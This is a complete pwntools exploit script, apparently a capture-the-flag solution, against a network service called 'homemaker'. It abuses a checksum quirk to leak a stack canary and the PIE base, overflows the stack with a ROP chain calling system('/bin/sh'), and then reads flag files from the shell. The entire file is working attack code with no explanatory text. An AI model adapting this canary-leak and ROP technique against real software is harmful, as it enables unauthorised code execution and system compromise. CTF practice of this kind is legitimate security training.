#!/usr/bin/env python3
from pwn import *
import sys, time

context.arch = 'amd64'
context.log_level = 'info'

def crc8(data):
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = ((crc << 1) ^ 0x2f) & 0xff if crc & 0x80 else (crc << 1) & 0xff
    return crc

def frame(payload):
    body = bytes(payload)
    L = len(body)
    return b'\x1b[' + bytes([(L >> 8) & 0xff, L & 0xff]) + body + bytes([crc8(body)]) + b'\x1b\\'

POP_RDI  = 0x12aa
RET      = 0x101a
SYSTEM   = 0x10c0
RET_MAIN = 0x1a9f
BSS_IN   = 0x4860            # input buffer (payload pointer = buf+4 = 0x4864)

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        return remote('sunshinectf.games', 26008)
    return process('./homemaker')

def read_frame(io):
    buf = b''
    while True:
        try:
            buf += io.recv(timeout=3)
        except EOFError:
            return None
        i = buf.find(b'\x1b[')
        if i < 0:
            continue
        if len(buf) < i + 4:
            continue
        L = (buf[i+2] << 8) | buf[i+3]
        if len(buf) >= i + 7 + L:
            return buf[i+4:i+4+L]

io = start()

# 1. OPEN
io.send(frame(b'\x01' + p32(0x1337c35f, endian='big')))
read_frame(io)

# 2. WRITE 257 bytes; crc byte -> state[256] => state[0x100] = 0x1ff (511)
data = bytearray(b'A' * 256)
for v in range(256):
    data[255] = v
    if crc8(b'\x02' + bytes(data)) == 0xff:
        break
io.send(frame(b'\x02' + bytes(data)))
read_frame(io)

# 3. SHOW -> leak 511 bytes of state
io.send(frame(b'\x03'))
body = read_frame(io)
state = body[1:]
assert len(state) >= 288, len(state)

canary  = u64(state[264:272])
srbp    = u64(state[272:280])
retaddr = u64(state[280:288])
piebase = retaddr - RET_MAIN
log.info('canary  = %#x', canary)
log.info('piebase = %#x', piebase)

# 4. overflow: overwrite return address with ROP chain; rdi -> "/bin/sh"
#    placed inside the .bss input buffer by the final (exit) frame.
payload  = b'/bin/sh\x00'                      # also at stack offset 0 (unused)
payload += b'B' * (264 - len(payload))
payload += p64(canary)
payload += p64(0)                              # saved rbp
payload += p64(piebase + POP_RDI)
payload += p64(piebase + BSS_IN + 5)           # -> "/bin/sh" in input buffer
payload += p64(piebase + RET)                  # alignment
payload += p64(piebase + SYSTEM)
io.send(frame(b'\x02' + payload))
read_frame(io)                                 # consume status

# 5. EXIT, embedding "/bin/sh" in the frame body which is written to .bss
io.send(frame(b'\x04' + b'/bin/sh\x00'))

time.sleep(0.5)
io.sendline(b'cat /flag* flag* /flag 2>/dev/null; id; echo ---DONE---')
time.sleep(1)
try:
    out = io.recv(timeout=5)
except Exception as e:
    out = b''
print(out.decode(errors='replace'))
io.interactive()
